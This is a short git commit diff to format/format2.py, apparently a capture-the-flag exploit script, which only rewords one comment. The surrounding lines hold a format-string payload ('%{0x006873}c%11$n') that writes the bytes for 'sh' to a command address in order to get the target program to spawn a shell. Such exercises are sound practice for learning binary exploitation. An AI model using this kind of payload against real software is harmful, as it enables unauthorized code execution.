ecd6e713b0044e26651c9389b5da0b29e86799c2
antkss <anfixgapps@gmail.com>
2023-12-31 11:38:10 +0700

    update

--- format/format2.py
+++ format/format2.py
@@ -15,7 +15,7 @@ cmd_address = 0x404060
 # you got 2 options here and they're both work
 # the first line will work if you believe that your computer will be replaced by another in the next year 
 # the second line will work if you believe that your computer is the most powerful computer in the world and it will never be replaced by another computer
-# uncomment them if you want to use 1 of them 
+# uncomment 1 if you want to use 1 of them 
 #payload = F'%{0x006873}c%11$n'.encode()
 #payload = F'%{0x26266873}c%11$n'.encode() 
 payload = payload.ljust(0x18, b'\x00')
